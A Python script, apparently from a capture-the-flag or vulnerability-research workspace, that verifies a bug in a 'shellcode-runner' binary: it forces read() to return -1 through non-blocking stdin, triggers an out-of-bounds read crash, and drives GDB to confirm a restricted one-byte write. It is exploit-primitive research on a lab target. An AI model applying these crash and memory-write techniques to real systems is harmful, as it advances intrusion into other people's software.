#!/usr/bin/env python3
"""
BUG-002: Final comprehensive verification.

PRIM-001: CRASH via OOB read at unmapped 0x1336FFFE
  - Triggered by non-blocking stdin (read returns -1/EAGAIN)
  - GDB simulation confirms crash at 0x4019e3 with rax=0x1336FFFE
  - Direct test: 5/5 runs crash with SIGSEGV
  - Status: VERIFIED

PRIM-002: RESTRICTED_WRITE (single NUL byte) at 0x1336FFFE
  - Requires 0x1336FFFE to be mapped AND contain 0x0a
  - In normal operation, 0x1336FFFE is unmapped (OOB read crashes first)
  - GDB test with mapped page confirms write instruction is reached
  - Status: THEORETICAL (structurally possible, but preconditions not met in normal operation)
"""

import os
import sys
import signal
import time
import subprocess
import fcntl

TARGET = "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target"

def prim001_crash_nonblocking():
    """
    PRIM-001: CRASH via OOB read at 0x1336FFFE.
    
    Trigger: Set stdin to non-blocking mode. read() returns -1 (EAGAIN).
    The code checks read_ret != 0 (passes since -1 != 0).
    Then computes buf[read_ret - 1] = buf[-2] = 0x1336FFFE.
    movzx eax, [rax] reads from unmapped 0x1336FFFE -> SIGSEGV.
    
    Evidence:
    - return_code = -11 (SIGSEGV)
    - No register dump in stdout (crash before shellcode execution)
    - GDB simulation: crash at 0x4019e3, rax=0x1336FFFE, rdx=-2
    """
    print("=== PRIM-001: CRASH via OOB read at 0x1336FFFE ===")
    
    r, w = os.pipe()
    
    # Set read end to non-blocking
    flags = fcntl.fcntl(r, fcntl.F_GETFL)
    fcntl.fcntl(r, fcntl.F_SETFL, flags | os.O_NONBLOCK)
    
    proc = subprocess.Popen(
        [TARGET],
        stdin=r,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    
    os.close(r)
    # Keep write end open - no data, non-blocking -> EAGAIN
    
    try:
        stdout, stderr = proc.communicate(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
        stdout, stderr = proc.communicate()
    
    os.close(w)
    
    rc = proc.returncode
    print(f"  return_code: {rc}")
    print(f"  stdout: {stdout[:200]}")
    
    # Verify evidence
    has_segv = (rc == -11)
    no_reg_dump = (b"rax = " not in stdout)
    has_prompt = (b"Input your shellcode" in stdout)
    
    print(f"  SIGSEGV (rc=-11): {has_segv}")
    print(f"  No register dump (crash before exec): {no_reg_dump}")
    print(f"  Prompt shown (reached read): {has_prompt}")
    
    if has_segv and no_reg_dump and has_prompt:
        print("  === PRIM-001: VERIFIED ===")
        print(f"  fault_address: 0x1336FFFE (mmap_buf[0x13370000] - 2)")
        print(f"  crash_instruction: 0x4019e3 (movzbl (%rax),%eax)")
        print(f"  return_code: -11 (SIGSEGV)")
        return True
    else:
        print("  PRIM-001: NOT VERIFIED")
        return False


def prim001_gdb_confirmation():
    """
    GDB confirmation: simulate read()=-1 and verify crash details.
    """
    print("\n=== PRIM-001: GDB confirmation ===")
    
    gdb_cmds = [
        "set pagination off",
        "set confirm off",
        "b *0x4019b2",
        "run",
        # Set read return value to -1
        "set {int}($rbp - 0xac) = -1",
        "set $eax = -1",
        "print/x *(int*)($rbp - 0xac)",
        # Set breakpoints at OOB read and write
        "b *0x4019e3",
        "b *0x4019fd",
        "continue",
        # Should be at 0x4019e3 (OOB read)
        "info registers rax rdx rip",
        "x/i $rip",
        # Continue - should crash
        "continue",
        "info registers rax rip",
        "bt",
    ]
    
    cmd = ["gdb", "-q", "--batch"]
    for c in gdb_cmds:
        cmd.extend(["-ex", c])
    cmd.append(TARGET)
    
    proc = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    
    stdout, stderr = proc.communicate(input=b"AAAA\n", timeout=15)
    output = stdout.decode('utf-8', errors='replace')
    print(f"  GDB Output:\n{output}")
    
    # Extract key evidence
    has_read_neg1 = "0xffffffff" in output
    has_oob_addr = "0x1336fffe" in output
    has_crash_at_read = "SIGSEGV" in output and "0x4019e3" in output
    
    print(f"  read() returned -1: {has_read_neg1}")
    print(f"  OOB address 0x1336FFFE: {has_oob_addr}")
    print(f"  Crash at OOB read (0x4019e3): {has_crash_at_read}")
    
    if has_read_neg1 and has_oob_addr and has_crash_at_read:
        print("  === PRIM-001: VERIFIED (GDB confirmed) ===")
        return True
    return False


def prim002_oob_write_theoretical():
    """
    PRIM-002: RESTRICTED_WRITE (single NUL byte at 0x1336FFFE).
    
    The OOB write path (0x4019fd) is only reached if:
    1. read() returns -1 (triggers OOB access)
    2. The byte at 0x1336FFFE equals 0x0a (newline)
    
    In normal operation, 0x1336FFFE is unmapped, so the OOB read at 0x4019e3
    crashes first. The OOB write is never reached.
    
    GDB test with mapped page confirms the write instruction IS reached
    when the address is mapped and contains 0x0a.
    """
    print("\n=== PRIM-002: RESTRICTED_WRITE (single NUL byte) ===")
    
    # GDB test: map 0x1336FFFE, set byte to 0x0a, simulate read()=-1
    gdb_cmds = [
        "set pagination off",
        "set confirm off",
        "b *0x4019b2",
        "run",
        "set {int}($rbp - 0xac) = -1",
        "set $eax = -1",
        # Map page covering 0x1336FFFE
        "call (void*)mmap(0x1336F000, 0x1000, 7, 0x22, -1, 0)",
        # Set byte at 0x1336FFFE to 0x0a
        "set {char}0x1336FFFE = 0x0a",
        "x/4bx 0x1336FFFE",
        # Breakpoints
        "b *0x4019e3",
        "b *0x4019fd",
        "continue",
        # At OOB read
        "info registers rax rip",
        "x/1bx 0x1336FFFE",
        "continue",
        # At OOB write
        "info registers rax rip",
        "x/1bx 0x1336FFFE",
        # Continue past write
        "ni",
        "x/1bx 0x1336FFFE",
    ]
    
    cmd = ["gdb", "-q", "--batch"]
    for c in gdb_cmds:
        cmd.extend(["-ex", c])
    cmd.append(TARGET)
    
    proc = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    
    stdout, stderr = proc.communicate(input=b"AAAA\n", timeout=15)
    output = stdout.decode('utf-8', errors='replace')
    print(f"  GDB Output:\n{output}")
    
    # Check if OOB write happened
    has_write_bp = "0x4019fd" in output
    byte_was_0a = "0x0a" in output
    
    print(f"  OOB write instruction reached: {has_write_bp}")
    print(f"  Byte was 0x0a before write: {byte_was_0a}")
    
    if has_write_bp:
        print("  === PRIM-002: THEORETICAL ===")
        print("  The OOB write instruction IS reached when 0x1336FFFE is mapped.")
        print("  However, in normal operation 0x1336FFFE is unmapped (OOB read crashes first).")
        print("  The write is a single NUL byte (0x00) at a fixed address (0x1336FFFE).")
        print("  This is a RESTRICTED_WRITE (single byte, fixed target, only writes 0x00).")
        return True
    return False


if __name__ == "__main__":
    print("=" * 60)
    print("BUG-002: READ_RETURN_VALUE_INSUFFICIENT_CHECK")
    print("Primitive Verification")
    print("=" * 60)
    
    r1 = prim001_crash_nonblocking()
    r2 = prim001_gdb_confirmation()
    r3 = prim002_oob_write_theoretical()
    
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"PRIM-001 (CRASH): {'VERIFIED' if r1 and r2 else 'NOT VERIFIED'}")
    print(f"PRIM-002 (RESTRICTED_WRITE): {'THEORETICAL' if r3 else 'NOT CONFIRMED'}")
